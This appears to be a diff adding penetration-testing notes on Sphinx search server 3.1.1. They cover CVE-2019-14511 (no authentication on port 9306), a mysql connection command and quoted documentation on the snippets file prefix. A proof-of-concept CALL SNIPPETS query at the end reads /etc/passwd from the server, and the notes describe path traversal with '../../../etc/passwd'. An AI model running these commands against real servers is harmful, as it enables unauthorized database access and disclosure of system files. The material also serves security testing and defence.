@@ -1,0 +1,43 @@
+Sphinx - Open Source Search Server
+http://sphinxsearch.com/docs/
+
+	Sphinx is a free, dual-licensed search server. Sphinx is written in C++, and focuses on
+	query performance and search relevance.
+
+CVE-2019-14511:
+	Sphinx 3.1.1 by default has no authentication and listens on 0.0.0.0, port 9306, making it exposed to the internet
+	(unless filtered by a firewall or reconfigured to listen to 127.0.0.1 only)
+
+	Command:
+		mysql --protocol=TCP -P9306 -h <host>
+		...
+		MySQL [(none)]> show tables;
+
+Another vulnerability – CALL SNIPPETS() could let you read any file from the OS.
+There is no CVE for this, It was mentioned in the comment section for CVE-2019-14511
+
+	https://blog.wirhabenstil.de/2019/08/19/sphinxsearch-0-0-0-09306-cve-2019-14511
+	https://docs.manticoresearch.com/latest/singlehtml/index.html#snippets-file-prefix
+
+	snippets_file_prefix:
+	A prefix to prepend to the local file names when generating snippets. Optional, default is current working folder.
+	This prefix can be used in distributed snippets generation along with load_files or load_files_scattered options.
+	Note how this is a prefix, and not a path! Meaning that if a prefix is set to “server1” and the request refers to “file23”,
+	searchd will attempt to open “server1file23” (all of that without quotes). So if you need it to be a path, you have to mention the trailing slash.
+	After constructing final file path, daemon unwinds all relative dirs and compares final result with the value of snippet_file_prefix. If
+	result is not begin with the prefix, such file will be rejected with error message.
+
+	So, if you set it to ‘/mnt/data’ and somebody calls snippet generation with file ‘../../../etc/passwd’, as the source, it will
+	get error message File ‘/mnt/data/../../../etc/passwd’ escapes ‘/mnt/data/’ scope instead of content of the file.
+	Also, with non-set parameter and reading ‘/etc/passwd’ it will actually read /daemon/working/folder/etc/passwd since default for param is 
+	exactly daemon’s working folder.
+
+	Note also that this is a local option, it does not affect the agents anyhow. So you can safely set a prefix on a master server. The
+	requests routed to the agents will not be affected by the master’s setting. They will however be affected by the agent’s own settings.
+	This might be useful, for instance, when the document storage locations (be those local storage or NAS mountpoints) are inconsistent across the servers.
+
+PoC:
+	Sphinx 3.1.1
+	NOTE: "blog" here is the name of a table, change to something from "show tables;"
+
+	MySQL> CALL SNIPPETS(('/etc/passwd'), 'blog', 'hello world', 2048 AS around, 20000000 AS limit, -1 AS load_files);
